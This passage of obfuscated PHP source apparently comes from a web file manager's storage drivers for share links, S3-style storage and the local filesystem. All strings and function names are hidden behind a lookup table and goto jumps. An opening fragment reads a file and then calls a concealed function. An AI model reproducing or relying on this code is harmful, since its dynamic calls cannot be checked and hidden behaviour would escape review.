$_SERVER[$_SERVER[³Ôà×Ó][432]]) { $_getc = $_SERVER[³Ôà×Ó][433]; $_getfile = $_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³Ôà×Ó][262], $_getfilec); if (count($_getarrs) < $_SERVER[³Ôà×Ó][436]) { $exit = $_SERVER[³Ôà×Ó][437]; $exit(); } $_act = $_SERVER[³Ôà×Ó][438]; $_act($_SERVER[$_SERVER[³Ôà×Ó][439]]); } goto fÃà¨…­†·; e©°¤Û¬: class PathDriverDbShareLink extends PathDriverDB { public function __construct($–Ùû–Ûç) { $this->pathParse = $–Ùû–Ûç; $this->model = Model($_SERVER[³Ôà×Ó][1414]); } protected function infoParse($ÍëÈ—¼, $¨–æ¹ı = false, $ë“Š‹ÍØ = false) { $‰ñ–„—ç =& $_SERVER[³Ôà×Ó]; return Action($‰ñ–„—ç[1253])->sharePathInfo($this->pathParse[$‰ñ–„—ç[87]], !0, $¨–æ¹ı); } public function remove($îûôÄ, $˜õåô¾Ü = true) { return !0; } public function listPath($Ò§Ì°Âò, $á÷ŞàÁ” = false) { $”ÍÈ‰Æ =& $_SERVER[³Ôà×Ó]; $ò°ùøŞ = parent::listPath($Ò§Ì°Âò, $á÷ŞàÁ”); if (!$ò°ùøŞ) { return $ò°ùøŞ; } if (is_array($ò°ùøŞ[$”ÍÈ‰Æ[1422]])) { $ò°ùøŞ[$”ÍÈ‰Æ[1422]] = Action($”ÍÈ‰Æ[1253])->shareItemInfo($ò°ùøŞ[$”ÍÈ‰Æ[1422]]); } foreach ($ò°ùøŞ as $¥–ÚÃèú => $‰Ø‰Àš÷) { if (!in_array($¥–ÚÃèú, array($”ÍÈ‰Æ[86], $”ÍÈ‰Æ[85]))) { continue; } foreach ($‰Ø‰Àš÷ as $ö‹öÑ’¦ => $°ÆƒŞÚæ) { $ò°ùøŞ[$¥–ÚÃèú][$ö‹öÑ’¦] = Action($”ÍÈ‰Æ[1253])->shareItemInfo($°ÆƒŞÚæ); } } return $ò°ùøŞ; } public function listAll($ßõ ‡Ã) { $šİË¿Æ‚ =& $_SERVER[³Ôà×Ó]; $Ü´–šÏ¼ = IO::info($this->pathParse[$šİË¿Æ‚[87]]); if (!$Ü´–šÏ¼) { return array(); } $¦ó¬ùâÔ = $this->model->listAll($ßõ ‡Ã); foreach ($¦ó¬ùâÔ as &$í…ç£©) { $í…ç£©[$šİË¿Æ‚[90]] = Action($šİË¿Æ‚[1253])->shareItemInfo($í…ç£©[$šİË¿Æ‚[90]]); } unset($í…ç£©); return $¦ó¬ùâÔ; } } class PathDriverDriverShareItem { public function __construct($²ÈÎ“•­) { $this->pathParse = $²ÈÎ“•­; } public function __call($ûçÅ”È¼, $ø¢÷¢Ú) { $ÁáÓ»ŒŠ =& $_SERVER[³Ôà×Ó]; if (method_exists($this, $ûçÅ”È¼)) { return; } $Íùí›ñ£ = call_user_func_array(array($ÁáÓ»ŒŠ[1423], $ûçÅ”È¼), $ø¢÷¢Ú); $©œÅ¶ä­ = array($ÁáÓ»ŒŠ[1424], $ÁáÓ»ŒŠ[1425], $ÁáÓ»ŒŠ[1426], $ÁáÓ»ŒŠ[1427], $ÁáÓ»ŒŠ[627], $ÁáÓ»ŒŠ[629], $ÁáÓ»ŒŠ[1428], $ÁáÓ»ŒŠ[110], $ÁáÓ»ŒŠ[1429], $ÁáÓ»ŒŠ[1430]); if (in_array($ûçÅ”È¼, $©œÅ¶ä­)) { $Íùí›ñ£ = $this->getPathOuter($Íùí›ñ£); } return $Íùí›ñ£; } public function copy($£¾…»ùú, $ßÓ†õƒñ, $¡¤ Ä Î = false, $Ìº³ßÎ  = false) { return $this->copyMove($£¾…»ùú, $ßÓ†õƒñ, $¡¤ Ä Î, $_SERVER[³Ôà×Ó][627], $Ìº³ßÎ ); } public function move($ÕÜéôÄ€, $ÇÄ“Úå, $ä‡¨Õ½Â = false, $ñ¶„º€ê = false) { return $this->copyMove($ÕÜéôÄ€, $ÇÄ“Úå, $ä‡¨Õ½Â, $_SERVER[³Ôà×Ó][629], $ñ¶„º€ê); } private function copyMove($¨¦“ô§”, $óËÌ¥Â, $ı»‡±¸, $½á×İƒ, $öï€¤ÏÆ = false) { $˜•Şƒİ¦ =& $_SERVER[³Ôà×Ó]; $çí½ê·‡ = $óËÌ¥Â; $Û¢ß şù = IO::driverMake($óËÌ¥Â); if ($Û¢ß şù->pathParse[$˜•Şƒİ¦[1229]]) { $óËÌ¥Â = $Û¢ß şù->pathParse[$˜•Şƒİ¦[1229]]; } else { $óËÌ¥Â = $çí½ê·‡; } $ êĞòìÚ = IO::copyMove($¨¦“ô§”, $óËÌ¥Â, $ı»‡±¸, $½á×İƒ, $öï€¤ÏÆ); $ êĞòìÚ = $this->getPathOuter($ êĞòìÚ); return $ êĞòìÚ; } public function pathThis($õ®€ğ÷¹) { return get_path_this($this->pathParse[$_SERVER[³Ôà×Ó][87]]); } public function pathFather($œ†öâ¤) { return get_path_father($this->pathParse[$_SERVER[³Ôà×Ó][87]]); } public function iconvSystem($åùÄ´“Æ) { return $åùÄ´“Æ; } protected function infoParse($«”†Ğ†Õ, $š„ßàÎ = false) { $ÓŠ†ªÂ˜ =& $_SERVER[³Ôà×Ó]; $İËµ¢ï = $this->pathParse[$ÓŠ†ªÂ˜[569]][$ÓŠ†ªÂ˜[1254]] . $this->pathParse[$ÓŠ†ªÂ˜[1247]]; if ($š„ßàÎ) { $ÓŠ§¯ = IO::infoWithChildren($İËµ¢ï); } else { $ÓŠ§¯ = IO::info($İËµ¢ï); } $î¥ß”§ş = $this->pathParse[$ÓŠ†ªÂ˜[569]]; return Action($ÓŠ†ªÂ˜[1421])->_shareItemeParse($ÓŠ§¯, $î¥ß”§ş); } public function listAll($‰‘ƒ³à‘) { $±ßÏõ¾š =& $_SERVER[³Ôà×Ó]; $‡‚Æ»­Ï = IO::listAll($‰‘ƒ³à‘); $şŠ¢Şª = rtrim($this->pathParse[$±ßÏõ¾š[569]][$±ßÏõ¾š[1254]], $±ßÏõ¾š[8]); foreach ($‡‚Æ»­Ï as &$ù€É™ü×) { $ù€É™ü×[$±ßÏõ¾š[87]] = $this->pathDriver . $±ßÏõ¾š[8] . ltrim(substr($ù€É™ü×[$±ßÏõ¾š[87]], strlen($şŠ¢Şª)), $±ßÏõ¾š[8]); } unset($ù€É™ü×); return $‡‚Æ»­Ï; } public function listAllSimple($Ğ»Î†ä™, $İê›˜• = false) { $µ˜ŒŸ¢ =& $_SERVER[³Ôà×Ó]; $Ûáóªóè = $this->listAll($Ğ»Î†ä™); $åÈ°ì– = $this->pathParse[$µ˜ŒŸ¢[504]]; if (trim($åÈ°ì–, $µ˜ŒŸ¢[8]) == trim(get_path_father($åÈ°ì–), $µ˜ŒŸ¢[8])) { $İê›˜• = !0; } return IO::init($µ˜ŒŸ¢[12])->listAllSimpleMake($Ûáóªóè, $åÈ°ì–, $İê›˜•); } public function getPathOuter($¢ş…¢ë) { $²½óŒ³³ =& $_SERVER[³Ôà×Ó]; $¨ïî©ÓÂ = KodIO::parse($¢ş…¢ë); if ($¨ïî©ÓÂ[$²½óŒ³³[33]] == KodIO::KOD_SHARE_ITEM) { return $¨ïî©ÓÂ[$²½óŒ³³[87]]; } $­—¯»­ = KodIO::clear($¢ş…¢ë); $é—Ù‚× = KodIO::clear($this->pathParse[$²½óŒ³³[569]][$²½óŒ³³[1254]]); $„ˆ‚Œ‚² = substr($­—¯»­, strlen($é—Ù‚×)); if (substr($­—¯»­, 0, strlen($é—Ù‚×)) != $é—Ù‚×) { return !1; } return $this->pathParse[$²½óŒ³³[1248]] . $²½óŒ³³[8] . ltrim($„ˆ‚Œ‚², $²½óŒ³³[8]); } public function getType() { $¾á¹ÛÒñ =& $_SERVER[³Ôà×Ó]; $ÙÌ ÂÚ = str_replace($¾á¹ÛÒñ[77], $¾á¹ÛÒñ[12], get_class($this)); return strtolower($ÙÌ ÂÚ); } public function isOsDriver($·ŒÉÇ Ì) { return IO::isOsDriver($·ŒÉÇ Ì); } public function info($«¨¿¸») { return $this->infoParse($«¨¿¸»); } public function infoAuth($¬®íì‹) { return $this->infoParse($¬®íì‹); } public function infoWithChildren($úàè¤Ğ‰) { return $this->infoParse($úàè¤Ğ‰, !0); } public function infoFull($ºä¥ØÌš) { return $this->infoParse($ºä¥ØÌš); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($„çˆòÔ²) { $this->pathParse = $„çˆòÔ²; } protected function infoParse($½Ë°Üò÷, $–å²İ„© = false) { $ó¼ãŞÑï =& $_SERVER[³Ôà×Ó]; return Action($ó¼ãŞÑï[1253])->sharePathInfo($this->pathParse[$ó¼ãŞÑï[87]], !0, $–å²İ„©); } public function listPath($ææ€Õ­, $ŸÈŠçŠœ = false) { $¸¿—æ¸à =& $_SERVER[³Ôà×Ó]; $ªÑ¸™Å  = IO::listPath($ææ€Õ­, $ŸÈŠçŠœ); if (!$ªÑ¸™Å ) { return $ªÑ¸™Å ; } if (is_array($ªÑ¸™Å [$¸¿—æ¸à[1422]])) { $ÂºÇóó› = Action($¸¿—æ¸à[1431])->parsePathChildren($ªÑ¸™Å [$¸¿—æ¸à[1422]], array($¸¿—æ¸à[504] => $ææ€Õ­)); $ªÑ¸™Å [$¸¿—æ¸à[1422]] = Action($¸¿—æ¸à[1253])->shareItemInfo($ÂºÇóó›); } foreach ($ªÑ¸™Å  as $¸ÓÍÙ¬¿ => $´¿´Õ») { if (!in_array($¸ÓÍÙ¬¿, array($¸¿—æ¸à[86], $¸¿—æ¸à[85]))) { continue; } foreach ($´¿´Õ» as $ÆïÔìÓ¢ => $ÂºÇóó›) { $ÂºÇóó› = Action($¸¿—æ¸à[1431])->parsePathChildren($ÂºÇóó›, array($¸¿—æ¸à[504] => $ææ€Õ­)); $ªÑ¸™Å [$¸ÓÍÙ¬¿][$ÆïÔìÓ¢] = Action($¸¿—æ¸à[1253])->shareItemInfo($ÂºÇóó›); } } return $ªÑ¸™Å ; } } goto d‘÷Ë½²âº; dœÒççõšˆ: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($·˜éµˆ·) { parent::__construct($·˜éµˆ·); $this->setSignVersion($_SERVER[³Ôà×Ó][247]); } public function uploadLink($ ö•Ø««, $›£ÑÕ³Š = 0) { $ÕÓŸª¢Ã =& $_SERVER[³Ôà×Ó]; if ($this->isUploadServer()) { return; } $«ŸÕèé„ = $this->getType(); if (!in_array($«ŸÕèé„, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¢Ü·³ó€ = (!$›£ÑÕ³Š ? 1 : ceil($›£ÑÕ³Š / pow(1024, 3))) * 3600 * 4; $µ˜Ú¿¡õ = $this->multiUploadFormData($ ö•Ø««, $¢Ü·³ó€); if ($µ˜Ú¿¡õ) { $µ˜Ú¿¡õ[$ÕÓŸª¢Ã[97]] = $ ö•Ø««; $µ˜Ú¿¡õ[$ÕÓŸª¢Ã[98]] = $«ŸÕèé„; } return $µ˜Ú¿¡õ; } public function fileOutImage($ÇîÌå±ö, $Ó‰ÏË¶Õ = 250) { if ($this->size($ÇîÌå±ö) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÇîÌå±ö, $Ó‰ÏË¶Õ); } $ İÆ¾ó = $this->link($ÇîÌå±ö); $ İÆ¾ó .= $_SERVER[³Ôà×Ó][1448] . $Ó‰ÏË¶Õ; $this->fileOutLink($ İÆ¾ó); } public function fileOutLink($²Ô”œµ½) { $ÊÔÚÔ„™ =& $_SERVER[³Ôà×Ó]; if (substr($²Ô”œµ½, 0, 7) == $ÊÔÚÔ„™[313]) { $²Ô”œµ½ = $ÊÔÚÔ„™[314] . substr($²Ô”œµ½, 7); } header($ÊÔÚÔ„™[175] . $²Ô”œµ½); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ƒ§ªîÃ˜) { if (substr($ƒ§ªîÃ˜, 0, 2) == $_SERVER[³Ôà×Ó][1435]) { $ƒ§ªîÃ˜ = BASIC_PATH . substr($ƒ§ªîÃ˜, 2); } return $ƒ§ªîÃ˜; } public function iconvApp($„ƒÙ«íŒ) { $ÙãÖŞ¼‡ =& $_SERVER[³Ôà×Ó]; global $config; return $this->iconvTo($„ƒÙ«íŒ, $config[$ÙãÖŞ¼‡[1433]], $config[$ÙãÖŞ¼‡[1432]]); } public function iconvSystem($á‰Õß¯ï) { $¶Ó…ÕÖ =& $_SERVER[³Ôà×Ó]; global $config; return $this->iconvTo($á‰Õß¯ï, $config[$¶Ó…ÕÖ[1432]], $config[$¶Ó…ÕÖ[1433]]); } public function getPathOuter($ÇóĞË–Í) { $¥Ÿƒ¶ÛÃ =& $_SERVER[³Ôà×Ó]; $ÒÍèÂĞ = $this->iconvApp($this->pathBase); $ÇóĞË–Í = $this->iconvApp($ÇóĞË–Í); if (substr($ÒÍèÂĞ, 0, 2) == $¥Ÿƒ¶ÛÃ[1435]) { $ÒÍèÂĞ = BASIC_PATH . substr($ÒÍèÂĞ, 2); } if (substr($ÇóĞË–Í, 0, 2) == $¥Ÿƒ¶ÛÃ[1435]) { $ÇóĞË–Í = BASIC_PATH . substr($ÇóĞË–Í, 2); } $ÒÍèÂĞ = KodIO::clear($ÒÍèÂĞ); $ÇóĞË–Í = KodIO::clear($ÇóĞË–Í); $ÇóĞË–Í = substr($ÇóĞË–Í, strlen($ÒÍèÂĞ)); if (empty($this->pathDriver)) { return $ÇóĞË–Í; } return $this->pathDriver . $¥Ÿƒ¶ÛÃ[8] . ltrim($ÇóĞË–Í, $¥Ÿƒ¶ÛÃ[8]); } public function mkfile($«—•ƒ¼, $¥¦Áöú = '', $Êš”‡’ª = REPEAT_RENAME) { $«—•ƒ¼ = $this->iconvSystem($«—•ƒ¼); @touch($«—•ƒ¼); if ($¥¦Áöú) { file_put_contents($«—•ƒ¼, $¥¦Áöú); } @chmod($«—•ƒ¼, $this->pathAuth); if (is_file($«—•ƒ¼)) { return $this->getPathOuter($«—•ƒ¼); } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } public function mkdir($Ùü¢òŸ, $‡˜ÁòÊ‰ = REPEAT_SKIP) { $Ùü¢òŸ = $this->iconvSystem($Ùü¢òŸ); if (is_dir($Ùü¢òŸ)) { return $this->getPathOuter($Ùü¢òŸ); } if (!$this->mkdir($this->pathFather($Ùü¢òŸ))) { return !1; } @mkdir($Ùü¢òŸ, $this->pathAuth, !0); @chmod($Ùü¢òŸ, $this->pathAuth); if (is_dir($Ùü¢òŸ)) { return $this->getPathOuter($Ùü¢òŸ); } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } public function copyFile($‹òÄÁ•, $ÍÓ²Ñã) { $this->mkdir($this->pathFather($ÍÓ²Ñã)); $‹òÄÁ• = $this->iconvSystem($‹òÄÁ•); $ÍÓ²Ñã = $this->iconvSystem($ÍÓ²Ñã); $æ ÌŒï = copy_64($‹òÄÁ•, $ÍÓ²Ñã); @chmod($ÍÓ²Ñã, $this->pathAuth); if ($æ ÌŒï) { return $this->getPathOuter($ÍÓ²Ñã); } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } public function moveFile($»½×ØŒğ, $Ü¡Õ¶Å) { $this->mkdir($this->pathFather($Ü¡Õ¶Å)); $»½×ØŒğ = $this->iconvSystem($»½×ØŒğ); $Ü¡Õ¶Å = $this->iconvSystem($Ü¡Õ¶Å); $©¬‰ôôí = intval(@rename($»½×ØŒğ, $Ü¡Õ¶Å)); if (!$©¬‰ôôí) { if ($©¬‰ôôí = intval(@copy_64($»½×ØŒğ, $Ü¡Õ¶Å))) { @unlink($»½×ØŒğ); } } @chmod($Ü¡Õ¶Å, $this->pathAuth); if ($©¬‰ôôí) { return $this->getPathOuter($Ü¡Õ¶Å); } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } public function movePath($öÌôäÇ, $şæÀ¢„, $¿†²ìß = false) { $³›Ô«· =& $_SERVER[³Ôà×Ó]; $öÌôäÇ = $this->iconvSystem($öÌôäÇ); $şæÀ¢„ = $this->iconvSystem($şæÀ¢„); $ƒÀñ‹Ú = rtrim($şæÀ¢„, $³›Ô«·[8]) . $³›Ô«·[8] . ($¿†²ìß ? $¿†²ìß : get_path_this($öÌôäÇ)); if (file_exists($ƒÀñ‹Ú)) { return !1; } $ÂêÖÆ‰Ä = intval(@rename($öÌôäÇ, $ƒÀñ‹Ú)); $ÂêÖÆ‰Ä = file_exists($ƒÀñ‹Ú); if ($ÂêÖÆ‰Ä) { return $this->getPathOuter($ƒÀñ‹Ú); } $this->writeLog(__FUNCTION__ . $³›Ô«·[1445], !0); return !1; } public function delFile($ˆ§Åã×¬) { $ˆ§Åã×¬ = $this->iconvSystem($ˆ§Åã×¬); if (!@unlink($ˆ§Åã×¬)) { @chmod($ˆ§Åã×¬, $this->pathAuth); if (@unlink($ˆ§Åã×¬)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); return !1; } return !0; } public function delFolder($“ø ÛªŸ) { $ÛÍÜ¿¶à =& $_SERVER[³Ôà×Ó]; $“ø ÛªŸ = $this->iconvSystem($“ø ÛªŸ); if (!is_dir($“ø ÛªŸ)) { return !0; } if (!($¦¬Âáåœ = opendir($“ø ÛªŸ))) { return !1; } while (($ïØÁÄ¹… = readdir($¦¬Âáåœ)) !== !1) { if ($ïØÁÄ¹… == $ÛÍÜ¿¶à[10] || $ïØÁÄ¹… == $ÛÍÜ¿¶à[1360]) { continue; } $÷ë›šá = $“ø ÛªŸ . $ÛÍÜ¿¶à[8] . $ïØÁÄ¹…; if (is_file($÷ë›šá) || is_link($÷ë›šá)) { if (!unlink($÷ë›šá)) { chmod($÷ë›šá, $this->pathAuth); if (!unlink($÷ë›šá)) { return !1; } } } else { if (is_dir($÷ë›šá)) { chmod($÷ë›šá, $this->pathAuth); $÷ë›šá = $this->iconvApp($÷ë›šá); if (!$this->delFolder($÷ë›šá)) { return !1; } } } } closedir($¦¬Âáåœ); return rmdir($“ø ÛªŸ); } public function rename($Ù»ò¿œÔ, $¥îå¯ƒª) { $ÎÔÎù² =& $_SERVER[³Ôà×Ó]; $é¥Ìšµ× = $this->fileNameAuto($this->pathFather($Ù»ò¿œÔ), $¥îå¯ƒª); $é¥Ìšµ× = $this->iconvSystem($é¥Ìšµ×); $Ù»ò¿œÔ = $this->iconvSystem($Ù»ò¿œÔ); $ÖÀñ¹èÎ = $this->pathFather($Ù»ò¿œÔ); $Ö—‰ƒÖã = rtrim($ÖÀñ¹èÎ, $ÎÔÎù²[8]) . $ÎÔÎù²[8] . $é¥Ìšµ×; $°Ì³¼Ğ· = @rename($Ù»ò¿œÔ, $Ö—‰ƒÖã); $Ö—‰ƒÖã = $this->iconvApp($Ö—‰ƒÖã); if ($°Ì³¼Ğ·) { return $this->getPathOuter($Ö—‰ƒÖã); } $this->writeLog(__FUNCTION__ . $ÎÔÎù²[1445], !0); return !1; } public function size($Ôî’„á°) { $Ôî’„á° = $this->iconvSystem($Ôî’„á°); return filesize_64($Ôî’„á°); } public function info($Ü—µù²) { $Ü—µù² = $this->iconvSystem($Ü—µù²); if ($this->isFolder($Ü—µù²)) { return $this->folderInfo($Ü—µù²); } else { if ($this->isFile($Ü—µù²)) { return $this->fileInfo($Ü—µù²); } } return !1; } protected function infoChildren($¾ğÆ¿úì, &$°€ğ†‹, $º¨óÊ¥Ú = true) { $–¯°Ñ¨ã =& $_SERVER[³Ôà×Ó]; check_abort_echo(); $¾ğÆ¿úì = rtrim($¾ğÆ¿úì, $–¯°Ñ¨ã[8]) . $–¯°Ñ¨ã[8]; if ($º¨óÊ¥Ú) { $¾ğÆ¿úì = $this->iconvSystem($¾ğÆ¿úì); } if (!($ïÔŞì = @opendir($¾ğÆ¿úì))) { return; } while (($‰—ÄÈÛË = readdir($ïÔŞì)) !== !1) { if ($‰—ÄÈÛË == $–¯°Ñ¨ã[10] || $‰—ÄÈÛË == $–¯°Ñ¨ã[1360]) { continue; } $¼ÅÛÓ¯É = $¾ğÆ¿úì . $‰—ÄÈÛË; if (is_file($¼ÅÛÓ¯É) || is_link($¼ÅÛÓ¯É)) { $°€ğ†‹[$–¯°Ñ¨ã[80]]++; $°€ğ†‹[$–¯°Ñ¨ã[79]] += filesize_64($¼ÅÛÓ¯É); } else { if (is_dir($¼ÅÛÓ¯É)) { $°€ğ†‹[$–¯°Ñ¨ã[81]]++; $this->infoChildren($¼ÅÛÓ¯É, $°€ğ†‹, !1); } } } closedir($ïÔŞì); } private function folderInfo($¶¸»ı¹†, $¤½è·ËÊ = false) { $şªôŒÔ° =& $_SERVER[³Ôà×Ó]; $¶¸»ı¹† = rtrim($¶¸»ı¹†, $şªôŒÔ°[8]) . $şªôŒÔ°[8]; $¸“ÈõàÎ = $this->iconvApp($this->pathThis($¶¸»ı¹†)); if ($¤½è·ËÊ) { return array($şªôŒÔ°[32] => $¸“ÈõàÎ, $şªôŒÔ°[87] => $this->getPathOuter($¶¸»ı¹†), $şªôŒÔ°[33] => $şªôŒÔ°[78]); } $ŒšŞÏ¬» = array($şªôŒÔ°[32] => $¸“ÈõàÎ, $şªôŒÔ°[87] => $this->getPathOuter($¶¸»ı¹†), $şªôŒÔ°[33] => $şªôŒÔ°[78], $şªôŒÔ°[231] => @filectime($¶¸»ı¹†), $şªôŒÔ°[88] => @filemtime($¶¸»ı¹†), $şªôŒÔ°[1449] => @fileatime($¶¸»ı¹†), $şªôŒÔ°[1450] => is_readable($¶¸»ı¹†), $şªôŒÔ°[1451] => is_writable($¶¸»ı¹†), $şªôŒÔ°[1452] => get_mode($¶¸»ı¹†)); return $ŒšŞÏ¬»; } private function fileInfo($ùóïÀÔ«, $ÚœÎ¡Ç¥ = false) { $ÅÈäƒãÁ =& $_SERVER[³Ôà×Ó]; $£ëøÔÀú = $this->iconvApp($this->pathThis($ùóïÀÔ«)); if ($ÚœÎ¡Ç¥) { return array($ÅÈäƒãÁ[32] => $£ëøÔÀú, $ÅÈäƒãÁ[87] => $this->getPathOuter($ùóïÀÔ«), $ÅÈäƒãÁ[33] => $ÅÈäƒãÁ[230], $ÅÈäƒãÁ[79] => $this->size($ùóïÀÔ«), $ÅÈäƒãÁ[169] => $this->ext($£ëøÔÀú)); } $Ñ¾Öã‚ = array($ÅÈäƒãÁ[32] => $£ëøÔÀú, $ÅÈäƒãÁ[87] => $this->getPathOuter($ùóïÀÔ«), $ÅÈäƒãÁ[33] => $ÅÈäƒãÁ[230], $ÅÈäƒãÁ[231] => @filectime($ùóïÀÔ«), $ÅÈäƒãÁ[88] => @filemtime($ùóïÀÔ«), $ÅÈäƒãÁ[1449] => @fileatime($ùóïÀÔ«), $ÅÈäƒãÁ[79] => $this->size($ùóïÀÔ«), $ÅÈäƒãÁ[169] => $this->ext($£ëøÔÀú), $ÅÈäƒãÁ[1450] => is_readable($ùóïÀÔ«), $ÅÈäƒãÁ[1451] => is_writable($ùóïÀÔ«), $ÅÈäƒãÁ[1452] => get_mode($ùóïÀÔ«)); return $Ñ¾Öã‚; } public function exist($“Îö¥œ) { $“Îö¥œ = $this->iconvSystem($“Îö¥œ); return @file_exists($“Îö¥œ); } public function isFile($îĞ¾•Ş¸) { $îĞ¾•Ş¸ = $this->iconvSystem($îĞ¾•Ş¸); return @is_file($îĞ¾•Ş¸); } public function isFolder($¾úş±â¾) { $¾úş±â¾ = $this->iconvSystem($¾úş±â¾); return @is_dir($¾úş±â¾); } public function listPath($öæÓáù”, $ö‡±±¼ë = false) { $ıò´Ç‚“ =& $_SERVER[³Ôà×Ó]; $öæÓáù” = $this->iconvSystem($öæÓáù”); $öæÓáù” = rtrim($öæÓáù”, $ıò´Ç‚“[8]) . $ıò´Ç‚“[8]; $ãßµ¦å¸ = array($ıò´Ç‚“[85] => array(), $ıò´Ç‚“[86] => array()); if (!($‡ŞÆÄ•ô = @opendir($öæÓáù”))) { return $ãßµ¦å¸; } while (($èÏ¸¦“© = readdir($‡ŞÆÄ•ô)) !== !1) { if ($èÏ¸¦“© == $ıò´Ç‚“[10] || $èÏ¸¦“© == $ıò´Ç‚“[1360]) { continue; } $›ÒŒò = $öæÓáù” . $èÏ¸¦“©; if (is_file($›ÒŒò)) { $ãßµ¦å¸[$ıò´Ç‚“[86]][] = $this->fileInfo($›ÒŒò, $ö‡±±¼ë); } else { $ãßµ¦å¸[$ıò´Ç‚“[85]][] = $this->folderInfo($›ÒŒò, $ö‡±±¼ë); } } closedir($‡ŞÆÄ•ô); return $ãßµ¦å¸; } public function listAll($è«ä¦±…, &$ò×…ùÍ = array()) { $Ô›·èò =& $_SERVER[³Ôà×Ó]; $è«ä¦±… = $this->iconvSystem($è«ä¦±…); $è«ä¦±… = rtrim($è«ä¦±…, $Ô›·èò[8]) . $Ô›·èò[8]; if (!($’×©—„Å = @opendir($è«ä¦±…))) { return $ò×…ùÍ; } while (($ô”–µ  = readdir($’×©—„Å)) !== !1) { if ($ô”–µ  == $Ô›·èò[10] || $ô”–µ  == $Ô›·èò[1360]) { continue; } $´öºş•æ = $è«ä¦±… . $ô”–µ ; $ŠÑı¯Š² = is_dir($´öºş•æ) && !is_link($´öºş•æ) ? 1 : 0; $´öºş•æ = $ŠÑı¯Š² ? $´öºş•æ . $Ô›·èò[8] : $´öºş•æ; $ò×…ùÍ[] = array($Ô›·èò[87] => $´öºş•æ, $Ô›·èò[78] => $ŠÑı¯Š², $Ô›·èò[88] => intval(@filemtime($´öºş•æ)), $Ô›·èò[79] => $ŠÑı¯Š² ? 0 : intval($this->size($´öºş•æ))); if ($ŠÑı¯Š²) { $this->listAll($´öºş•æ, $ò×…ùÍ); } } closedir($’×©—„Å); return $ò×…ùÍ; } public function has($êãÜÆÚ, $¡·Ù“ = false, $³ ì«öö = true) { $å¶ñÅÈÈ =& $_SERVER[³Ôà×Ó]; $êãÜÆÚ = $this->iconvSystem($êãÜÆÚ); $êãÜÆÚ = rtrim($êãÜÆÚ, $å¶ñÅÈÈ[8]) . $å¶ñÅÈÈ[8]; if (!($±åè·šŞ = @opendir($êãÜÆÚ))) { return !1; } $Ô¾ï…Œ’ = 0; $à®æ†‰Ö = 0; $ä‹³ı§ = 0; while (($Ü‰›ÄŠ = readdir($±åè·šŞ)) !== !1) { if ($Ü‰›ÄŠ == $å¶ñÅÈÈ[10] || $Ü‰›ÄŠ == $å¶ñÅÈÈ[1360]) { continue; } $¹ŞéûĞÏ = $êãÜÆÚ . $Ü‰›ÄŠ; if ($¡·Ù“) { $ä‹³ı§++; if (@is_file($¹ŞéûĞÏ)) { $Ô¾ï…Œ’++; } else { $à®æ†‰Ö++; } if ($ä‹³ı§ > 10000) { break; } continue; } if ($³ ì«öö) { if (@is_file($¹ŞéûĞÏ)) { return !0; } } else { if (@is_dir($¹ŞéûĞÏ . $å¶ñÅÈÈ[8])) { return !0; } } } closedir($±åè·šŞ); if ($¡·Ù“) { return array($å¶ñÅÈÈ[239] => $Ô¾ï…Œ’, $å¶ñÅÈÈ[240] => $à®æ†‰Ö); } return !1; } public function hashSimple($Î‡ÎûÎ„) { $€ï¶™¯ =& $_SERVER[³Ôà×Ó]; if (!$Î‡ÎûÎ„) { return md5($€ï¶™¯[12]); } $Î‡ÎûÎ„ = $this->iconvSystem($Î‡ÎûÎ„); $Ä×­İÉ– = $this->size($Î‡ÎûÎ„); $¬¼øª–É = 200; $×¿¬ïàç = 50; if ($Ä×­İÉ– <= $¬¼øª–É * $×¿¬ïàç) { return $this->hashMd5($Î‡ÎûÎ„) . $Ä×­İÉ–; } $ùÜåÒá¯ = $€ï¶™¯[12]; $ÓĞş™İî = intval($Ä×­İÉ– / $×¿¬ïàç); $ßµâ©¥ø = fopen($Î‡ÎûÎ„, $€ï¶™¯[1453]); if (!$ßµâ©¥ø) { return $ùÜåÒá¯; } for ($ÂÎÑ– = 0; $ÂÎÑ– < $×¿¬ïàç; $ÂÎÑ–++) { fseek_64($ßµâ©¥ø, $ÓĞş™İî * $ÂÎÑ–); $ùÜåÒá¯ .= fread($ßµâ©¥ø, $¬¼øª–É); } fseek_64($ßµâ©¥ø, $Ä×­İÉ– - $¬¼øª–É); $ùÜåÒá¯ .= fread($ßµâ©¥ø, $¬¼øª–É); fclose($ßµâ©¥ø); return md5($ùÜåÒá¯) . $Ä×­İÉ–; } public function getContent($ã€´ùëæ) { $ã€´ùëæ = $this->iconvSystem($ã€´ùëæ); return file_get_contents($ã€´ùëæ); } public function setContent($¹¢İ·Ö, $ğ„ãğµÄ = '') { $¹¢İ·Ö = $this->iconvSystem($¹¢İ·Ö); $Âè¸î± = @file_put_contents($¹¢İ·Ö, $ğ„ãğµÄ, LOCK_EX); if (!$Âè¸î±) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][1445], !0); } clearstatcache(); @chmod($¹¢İ·Ö, $this->pathAuth); return $Âè¸î± === !1 ? !1 : !0; } public function fileSubstr($ÛˆØ×ıè, $¡æŠ®ê€ = 0, $ÓÈ†î³ç = false) { $êÛååÍø =& $_SERVER[³Ôà×Ó]; $ÛˆØ×ıè = $this->iconvSystem($ÛˆØ×ıè); if ($ÓÈ†î³ç === !1) { $ÓÈ†î³ç = $this->size($ÛˆØ×ıè); } if ($ÓÈ†î³ç <= 0) { return $êÛååÍø[12]; } $Ô±ÜÚ¥Ú = fopen($ÛˆØ×ıè, $êÛååÍø[1453]); if (!$Ô±ÜÚ¥Ú) { return !1; } fseek_64($Ô±ÜÚ¥Ú, 